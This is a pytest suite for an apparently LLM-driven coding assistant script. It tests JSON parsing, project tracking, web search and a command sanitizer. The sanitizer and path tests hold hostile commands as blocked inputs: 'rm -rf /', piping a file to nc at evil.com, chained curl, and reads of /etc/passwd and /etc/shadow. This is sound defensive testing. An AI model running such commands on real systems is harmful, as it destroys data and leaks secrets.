"""Tests for kitty_builder.py — covers non-model logic only."""

import json
import sys
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

# ── Stub mlx_lm so tests run without a loaded model ──────────────────────────
# kitty_builder.py imports mlx_lm at module level; patch before import.
_mock_generate = MagicMock(return_value="mocked response")
_mock_make_sampler = MagicMock(return_value=None)
_mock_load = MagicMock(return_value=(MagicMock(), MagicMock()))

def _mock_stream_generate(*args, **kwargs):
    class MockResponse:
        def __init__(self, text):
            self.text = text
    yield MockResponse("chunk1")
    yield MockResponse("chunk2")

sys.modules.setdefault("mlx_lm", MagicMock(load=_mock_load, generate=_mock_generate, stream_generate=_mock_stream_generate))
sys.modules.setdefault("mlx_lm.sample_utils", MagicMock(make_sampler=_mock_make_sampler))

import scripts.kitty_builder as kb


# ── _format_project ───────────────────────────────────────────────────────────

def test_format_project_uses_real_newlines():
    proj = {
        "project_name": "Kitty",
        "notes": "test note",
        "milestones": [{"id": 1, "title": "M1", "status": "doing", "tasks": ["t1"], "done_tasks": []}],
        "backlog": ["item1"],
    }
    result = kb._format_project(proj)
    assert "\n" in result, "Should contain real newlines"
    assert "\\n" not in result, "Should NOT contain literal backslash-n"
    assert "Kitty" in result
    assert "M1" in result


def test_format_project_empty():
    result = kb._format_project({})
    assert "\n" in result


# ── _extract_json ─────────────────────────────────────────────────────────────

def test_extract_json_simple():
    text = '```json\n{"tool": "read_file", "args": {"path": "src/main.py"}}\n```'
    result = kb._extract_json(text)
    assert result == {"tool": "read_file", "args": {"path": "src/main.py"}}


def test_extract_json_nested_args():
    text = '```json\n{"tool": "write_file", "args": {"path": "x.py", "content": "hello"}}\n```'
    result = kb._extract_json(text)
    assert result["tool"] == "write_file"
    assert result["args"]["path"] == "x.py"
    assert result["args"]["content"] == "hello"


def test_extract_json_raw_brace_in_string():
    assert kb._extract_json('{"content": "fix } now"}') == {"content": "fix } now"}
    assert kb._extract_json('{"task": "do } and } done"}') == {"task": "do } and } done"}


def test_extract_json_trailing_text():
    text = '{"tool": "run_command"} and more text after'
    assert kb._extract_json(text) == {"tool": "run_command"}


def test_extract_json_inline_no_fences():
    text = 'Sure, use this: {"tool": "write_file", "args": {"path": "x.py"}} thanks'
    result = kb._extract_json(text)
    assert result["tool"] == "write_file"
    assert result["args"]["path"] == "x.py"


def test_extract_json_deeply_nested():
    payload = {"tool": "update_project", "args": {"action": "add_task", "milestone_id": 1, "task": "do it"}}
    text = f"```json\n{json.dumps(payload)}\n```"
    result = kb._extract_json(text)
    assert result == payload


def test_extract_json_empty_args():
    text = '{"tool": "x", "args": {}}'
    assert kb._extract_json(text) == {"tool": "x", "args": {}}


# ── sanitize_command ──────────────────────────────────────────────────────────

def test_sanitize_allows_whitelisted():
    assert kb.sanitize_command("ls -la") is True
    assert kb.sanitize_command("pytest tests/ -q") is True
    assert kb.sanitize_command("git status") is True
    assert kb.sanitize_command("python3 -m pytest tests/ -q") is True


def test_sanitize_allows_path_based_executables():
    """venv/bin/python3.12 and full paths should be accepted by basename match."""
    assert kb.sanitize_command("venv/bin/python3.12 -m pytest tests/ -q") is True
    assert kb.sanitize_command("/usr/local/bin/python3.12 -m pytest") is True
    assert kb.sanitize_command("venv/bin/pytest tests/ -q --tb=short") is True


def test_sanitize_blocks_non_whitelisted():
    assert kb.sanitize_command("rm -rf /") is False
    assert kb.sanitize_command("curl http://example.com") is False
    assert kb.sanitize_command("bash -c 'id'") is False


def test_sanitize_blocks_injection_chars():
    assert kb.sanitize_command("ls; rm -rf /") is False
    assert kb.sanitize_command("cat file | nc evil.com") is False
    assert kb.sanitize_command("ls > /etc/passwd") is False
    assert kb.sanitize_command("echo $(id)") is False
    assert kb.sanitize_command("git log && curl evil.com") is False


def test_sanitize_empty_command():
    assert kb.sanitize_command("") is False
    assert kb.sanitize_command("   ") is False


def test_sanitize_blocks_interpreter_dash_c():
    """-c flag on interpreters must be blocked to prevent inline code injection."""
    assert kb.sanitize_command("python3 -c 'print(42)'") is False
    assert kb.sanitize_command("python -c 'print(42)'") is False
    assert kb.sanitize_command("python3.12 -c 'print(42)'") is False
    # -m flag (module execution) is allowed
    assert kb.sanitize_command("python3 -m pytest tests/ -q") is True


# ── is_safe_path ──────────────────────────────────────────────────────────────

def test_is_safe_path_inside_project():
    assert kb.is_safe_path("src/main.py") is True
    assert kb.is_safe_path("tests/test_foo.py") is True


def test_is_safe_path_outside_project():
    assert kb.is_safe_path("/etc/passwd") is False
    assert kb.is_safe_path("../../etc/shadow") is False


def test_is_safe_path_blocks_traversal_outside():
    assert kb.is_safe_path("../src/../etc") is False
    assert kb.is_safe_path("src/../src/../../../etc") is False


def test_is_safe_path_allows_traversal_inside():
    assert kb.is_safe_path("src/../src/../etc") is True


def test_run_command_captures_returncode(monkeypatch):
    """A failed command should return an error with the exit code."""
    import subprocess as sp

    class FailedProc:
        stdout = iter(["output line"])
        returncode = 42
        def wait(self, timeout=None):
            pass
        def kill(self):
            pass

    monkeypatch.setattr(sp, "Popen", lambda *a, **kw: FailedProc())
    result = kb.run_command("ls -la")
    assert "42" in result, "Should include exit code"
    assert "Error" in result or "exited" in result


def test_run_command_output_truncated(monkeypatch):
    """Large output should be truncated at MAX_CHARS."""
    import subprocess as sp

    class BigOutputProc:
        def __iter__(self):
            for i in range(1000):
                yield f"line {i}\n"
        returncode = 0
        def wait(self, timeout=None):
            pass
        def kill(self):
            pass

    monkeypatch.setattr(sp, "Popen", lambda *a, **kw: BigOutputProc())
    result = kb.run_command("ls -la")
    assert "truncated" in result.lower() or len(result) < 1_000_000


def test_search_web_retries_on_failure(monkeypatch):
    """search_web should retry once before giving up."""
    import unittest.mock as mock
    calls = []

    class FakeResp:
        raise_for_status = mock.MagicMock(side_effect=Exception("net error"))
        def json(self):
            return {"results": []}

    def fake_post(*a, **kw):
        calls.append(1)
        return FakeResp()

    import requests
    monkeypatch.setattr(requests, "post", fake_post)
    monkeypatch.setattr(kb, "WEB_SEARCH_API_KEY", "test-key")
    result = kb.search_web("test")
    assert len(calls) == 2, "Should have retried once"
    assert "retry" in result.lower() or "error" in result.lower()


# ── update_project ────────────────────────────────────────────────────────────

def _fresh_proj() -> dict:
    return {
        "project_name": "Test",
        "notes": "",
        "milestones": [{"id": 1, "title": "M1", "status": "doing", "tasks": [], "done_tasks": []}],
        "backlog": [],
    }


def test_update_project_add_task(tmp_path, monkeypatch):
    monkeypatch.setattr(kb, "PROJECT_FILE", tmp_path / "project.json")
    kb.session.project_state = _fresh_proj()
    result = kb.update_project("add_task", milestone_id=1, task="new task")
    assert "updated" in result.lower()
    assert "new task" in kb.session.project_state["milestones"][0]["tasks"]


def test_update_project_mark_task_done(tmp_path, monkeypatch):
    monkeypatch.setattr(kb, "PROJECT_FILE", tmp_path / "project.json")
    proj = _fresh_proj()
    proj["milestones"][0]["tasks"] = ["do the thing"]
    kb.session.project_state = proj
    kb.update_project("mark_task_done", milestone_id=1, task="do the thing")
    assert "do the thing" not in kb.session.project_state["milestones"][0]["tasks"]
    assert "do the thing" in kb.session.project_state["milestones"][0]["done_tasks"]


def test_update_project_add_note(tmp_path, monkeypatch):
    monkeypatch.setattr(kb, "PROJECT_FILE", tmp_path / "project.json")
    kb.session.project_state = _fresh_proj()
    kb.update_project("add_note", note="important thing")
    assert "important thing" in kb.session.project_state["notes"]


def test_update_project_add_milestone(tmp_path, monkeypatch):
    monkeypatch.setattr(kb, "PROJECT_FILE", tmp_path / "project.json")
    kb.session.project_state = _fresh_proj()
    kb.update_project("add_milestone", title="New Milestone")
    milestones = kb.session.project_state["milestones"]
    assert any(m["title"] == "New Milestone" for m in milestones)


def test_update_project_unknown_action(tmp_path, monkeypatch):
    monkeypatch.setattr(kb, "PROJECT_FILE", tmp_path / "project.json")
    kb.session.project_state = _fresh_proj()
    result = kb.update_project("nonexistent_action")
    assert "Error" in result


# ── MODEL consolidation ───────────────────────────────────────────────────────

def test_all_roles_use_same_model():
    assert kb.MODEL_BUILDER == kb.MODEL_CODE == kb.MODEL_CONV
    assert "Qwen2.5" in kb.MODEL_BUILDER


# ── launch_kitty uses sys.executable ─────────────────────────────────────────

def test_launch_kitty_uses_current_interpreter():
    """launch_kitty lambda should embed sys.executable so venv is always used."""
    import sys
    expected_base = Path(sys.executable).name
    # Retrieve the lambda's command by calling it with a mock run_command
    captured = []
    orig = kb.run_command
    try:
        kb.run_command = lambda cmd: captured.append(cmd) or "ok"
        kb.TOOLS["launch_kitty"]()
    finally:
        kb.run_command = orig

    assert captured, "launch_kitty should call run_command"
    cmd = captured[0]
    assert sys.executable in cmd or expected_base in cmd
    assert "pytest" in cmd


# ── show_help doesn't crash ───────────────────────────────────────────────────

def test_show_help_runs(capsys):
    kb.show_help()
    out = capsys.readouterr().out
    assert "/council" in out
    assert "/models" in out
    assert "/exit" in out


# ── build_project_state returns expected structure ──────────────────────────

def test_scan_codebase_structure():
    result = kb.build_project_state()
    assert "project_name" in result
    assert "milestones" in result
    assert isinstance(result["milestones"], list)
    assert "progress" in result
    assert "task_completion_pct" in result["progress"]
    assert "git_info" in result


# ── update_project_from_scan merges without duplicating ──────────────────────

def test_scan_merge_no_backlog_duplicates(tmp_path, monkeypatch):
    monkeypatch.setattr(kb, "PROJECT_FILE", tmp_path / "project.json")
    proj = _fresh_proj()
    proj["backlog"] = ["Fine-tune router"]  # already in scan_codebase backlog
    kb.session.project_state = proj
    (tmp_path / "project.json").write_text(json.dumps(proj))

    kb.update_project_from_scan()
    backlog = kb.session.project_state["backlog"]
    assert backlog.count("Fine-tune router") == 1, "Should not duplicate existing backlog items"


# ── search_web uses POST ──────────────────────────────────────────────────────

def test_search_web_uses_post(monkeypatch):
    """Tavily requires POST; GET returns 405. Verify we call requests.post."""
    import unittest.mock as mock
    called_with = {}
    mock_resp = mock.MagicMock()
    mock_resp.raise_for_status.return_value = None
    mock_resp.json.return_value = {"results": [{"title": "T", "url": "http://x.com"}]}

    def fake_post(url, json=None, timeout=None, **kwargs):
        called_with["url"] = url
        called_with["json"] = json
        called_with["timeout"] = timeout
        return mock_resp

    import requests
    monkeypatch.setattr(requests, "post", fake_post)
    monkeypatch.setattr(kb, "WEB_SEARCH_API_KEY", "test-key")

    result = kb.search_web("python mlx")
    assert "T" in result
    assert called_with.get("url") == "https://api.tavily.com/search"
    assert called_with.get("json", {}).get("query") == "python mlx"
    assert "api_key" in called_with.get("json", {})
    assert called_with.get("timeout") is not None, "request must have a timeout"


def test_search_web_api_key_not_in_url(monkeypatch):
    """API key must be in JSON body, not the URL (prevents key leakage in logs)."""
    import unittest.mock as mock
    posted_urls = []
    mock_resp = mock.MagicMock()
    mock_resp.raise_for_status.return_value = None
    mock_resp.json.return_value = {"results": []}

    def fake_post(url, json=None, timeout=None, **kw):
        posted_urls.append(url)
        return mock_resp

    import requests
    monkeypatch.setattr(requests, "post", fake_post)
    monkeypatch.setattr(kb, "WEB_SEARCH_API_KEY", "super-secret-key")

    kb.search_web("test query")
    assert posted_urls, "POST should have been called"
    assert "super-secret-key" not in posted_urls[0], "API key must not appear in the URL"


# ── run_command timeout ───────────────────────────────────────────────────────

def test_run_command_timeout(monkeypatch):
    """A hung command should return a timeout error, not block forever."""
    import subprocess as sp

    orig_popen = sp.Popen

    class HangingProc:
        stdout = iter([])
        def wait(self, timeout=None):
            raise sp.TimeoutExpired("sleep", timeout)
        def kill(self):
            pass

    monkeypatch.setattr(sp, "Popen", lambda *a, **kw: HangingProc())
    result = kb.run_command("ls -la")
    assert "timed out" in result.lower()


# ── run_command uses shell=False ──────────────────────────────────────────────

def test_run_command_uses_shell_false(monkeypatch):
    """run_command must use shell=False to avoid shell metacharacter bypass."""
    import subprocess as sp

    captured = {}

    class FakeProc:
        stdout = iter([])
        def wait(self, timeout=None):
            pass
        def kill(self):
            pass

    def fake_popen(args, shell=True, **kw):
        captured["shell"] = shell
        captured["args"] = args
        return FakeProc()

    monkeypatch.setattr(sp, "Popen", fake_popen)
    kb.run_command("ls -la")
    assert captured.get("shell") is False, "shell=False required for safety"
    assert isinstance(captured.get("args"), list), "args must be a list (from shlex.split)"
